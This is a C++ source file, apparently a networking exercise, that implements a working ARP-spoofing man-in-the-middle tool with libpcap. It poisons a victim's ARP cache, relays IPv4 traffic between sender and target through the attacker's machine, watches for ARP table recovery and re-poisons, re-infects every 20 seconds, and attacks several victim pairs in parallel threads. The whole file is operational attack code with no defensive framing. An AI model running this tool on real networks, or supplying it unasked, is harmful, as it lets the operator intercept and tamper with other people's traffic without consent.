#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include "temp.h"
#include <ctime>
#include <iostream>
#include <vector>
#include <thread>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void sendPacket(pcap_t* handle, uint8_t* srcMac, uint8_t* dstMac, char* srcIp, char* dstIp){
	EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dstMac);
    packet.eth_.smac_ = Mac(srcMac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(srcMac);
    packet.arp_.sip_ = htonl(Ip(srcIp));
    packet.arp_.tmac_ = Mac(dstMac);
    packet.arp_.tip_ = htonl(Ip(dstIp));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void getMacByIp(pcap_t* handle, uint8_t* senderMac, uint8_t* targetMac, char* targetIp){
    uint8_t broadcastMac[7] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0};
    char ipZero[8] = "0.0.0.0";
    struct pcap_pkthdr* resHeader;
    const u_char* rawPacket;

    while(true){
        sendPacket(handle, senderMac, broadcastMac, ipZero, targetIp);

        int res = pcap_next_ex(handle, &resHeader, &rawPacket);
        if(res == 0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            printf("pcap_next_ex return %d\n",res);
            break;
        }

        EthArpPacket packet;
        memcpy(&packet, rawPacket, sizeof(EthArpPacket));

        if(ntohs(packet.eth_.type_) != 0x806) continue; //is ARP packet

        if(ntohs(packet.arp_.op_) != 2 || packet.arp_.sip() != Ip(targetIp)) continue; //is response

        memcpy(targetMac, (uint8_t*)packet.arp_.smac(), 6);

        break;
    }
}

void arpInfect(pcap_t* handle, uint8_t* attackerMac, uint8_t* senderMac, char* targetIp, char* senderIp){
    uint8_t broadcastMac[7] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0};
    char ipZero[8] = "0.0.0.0";
    struct pcap_pkthdr* resHeader;
    const u_char* rawPacket;

    bool success = false;

    do{
        sendPacket(handle, attackerMac, senderMac, targetIp, senderIp);

        while(1){
            //ARP table infect check by broadcast
            sendPacket(handle, attackerMac, broadcastMac, targetIp, ipZero);

            int res = pcap_next_ex(handle, &resHeader, &rawPacket);

            if(res == 0) continue;
            if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
                printf("pcap_next_ex return %d\n",res);
                break;
            }

            EthArpPacket packet;
            memcpy(&packet, rawPacket, sizeof(EthArpPacket));

            if(ntohs(packet.eth_.type_) != 0x806) continue; //is ARP packet

            if(ntohs(packet.arp_.op_) == 2 &&
            memcmp((uint8_t*)packet.arp_.tmac(), attackerMac, 6) == 0 &&
            packet.arp_.tip() == Ip(targetIp)){
                success = true;
                printf("ARP table infect success!\n");
                }
            break;
        }
    }while(!success);
}

void packetRelay(pcap_t* handle, uint8_t* attackerMac, uint8_t* targetMac, const u_char* rawPacket){
    struct IpHdr iphdr;
    memcpy(&iphdr, rawPacket + sizeof(EthHdr), sizeof(iphdr));

    struct EthHdr relayEthhdr;
    relayEthhdr.dmac_=Mac(targetMac);
    relayEthhdr.smac_=Mac(attackerMac);
    relayEthhdr.type_=htons(EthHdr::Ip4);

    uint8_t* relayPacket = (uint8_t*)malloc(0x600);
    memcpy(relayPacket, &relayEthhdr, sizeof(relayEthhdr));
    memcpy(relayPacket+sizeof(relayEthhdr), rawPacket+sizeof(relayEthhdr), ntohs(iphdr.ip_len));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(relayPacket), ntohs(iphdr.ip_len)+sizeof(relayEthhdr));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    free(relayPacket);
}


int arpSpoof(char* dev, char* senderIp, char* targetIp){
    uint8_t attackerMac[7];
    uint8_t senderMac[7];
    uint8_t targetMac[7];

    char attackerMacStr[18];
    char senderMacStr[18];
    char targetMacStr[18];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    int getMac = GetMacAddress(dev, attackerMac);
    if(getMac != 0){
        printf("Failed to get MAC address...\n");
        return -1;
    }
    getMacByIp(handle, attackerMac, senderMac, senderIp);
    getMacByIp(handle, attackerMac, targetMac, targetIp);

    //print mac address
    MacToStr(attackerMac, attackerMacStr);printf("Attacker's mac : %s\n", attackerMacStr);
    MacToStr(senderMac, senderMacStr);printf("sender's mac : %s(%s)\n", senderMacStr, senderIp);
    MacToStr(targetMac, targetMacStr);printf("target's mac : %s(%s)\n", targetMacStr, targetIp);

    arpInfect(handle, attackerMac, senderMac, targetIp, senderIp); //initiative infect
    struct pcap_pkthdr* resHeader;
    const u_char* rawPacket;
    bool again = false;

    while(true){
        int res = pcap_next_ex(handle, &resHeader, &rawPacket);

        if(res == 0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            printf("pcap_next_ex return %d\n",res);
            break;
        }

        EthArpPacket packet;
        memcpy(&packet, rawPacket, sizeof(EthArpPacket));

        if(ntohs(packet.eth_.type_) == 0x806){ //ARP - recover ARP table
            if(ntohs(packet.arp_.op_) != 1) continue;

            if(packet.arp_.sip() == Ip(senderIp) && packet.arp_.tip() == Ip(targetIp)){
                if(packet.eth_.dmac().isBroadcast()) {
                    printf("recover by sender(%s) -> target(%s)\n", senderIp, targetIp);
                    arpInfect(handle, attackerMac, senderMac, targetIp, senderIp);
                }
            }
            else if(packet.arp_.sip() == Ip(targetIp) && packet.arp_.tip() == Ip(senderIp)){
                printf("recover by target(%s) -> sender(%s)\n", targetIp, senderIp);
                arpInfect(handle, attackerMac, senderMac, targetIp, senderIp);
            }
        }
        else if(memcmp((uint8_t*)packet.eth_.smac(), senderMac, 6) == 0 &&
        memcmp((uint8_t*)packet.eth_.dmac(), attackerMac, 6) == 0 &&
        ntohs(packet.eth_.type_) == 0x800){ // relay from sender to target
            printf("relay : sender(%s) -> target(%s)\n",senderIp, targetIp);
            packetRelay(handle, attackerMac, targetMac, rawPacket);
        }
        else if(memcmp((uint8_t*)packet.eth_.smac(), targetMac, 6) == 0 &&
        memcmp((uint8_t*)packet.eth_.dmac(), attackerMac, 6) == 0 &&
        ntohs(packet.eth_.type_) == 0x800){ // relay from target to sender
            printf("relay : target(%s) -> sender(%s)\n", targetIp, senderIp);
            packetRelay(handle, attackerMac, senderMac, rawPacket);
        }

        //periodically infect
        time_t t;
        t = time(NULL);

        if(t % 20 == 0 && again == false) {
            printf("\nevery 20 seconds - infect again..(%s)\n", senderIp);
            arpInfect(handle, attackerMac, senderMac, targetIp, senderIp);
            again = true;
        }
        if(t % 3 == 0 && again == true) again = false;
    }

    pcap_close(handle);
    return 1;
}

int main(int argc, char* argv[]) {
	if (argc % 2  == 1 || argc < 3) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
    std::vector<std::thread> threadPool;

	for(int i=2; i<argc; i+=2){
		printf("----Set %d----\n", i/2);
        char *senderIp = argv[i];
        char *targetIp = argv[i+1];
        printf("Sender ip : %s\nTarget ip : %s\n\n", senderIp, targetIp);

        threadPool.emplace_back(arpSpoof, dev, senderIp, targetIp);
	}

    for(auto&thread : threadPool){
        thread.join();
    }

    return 0;
}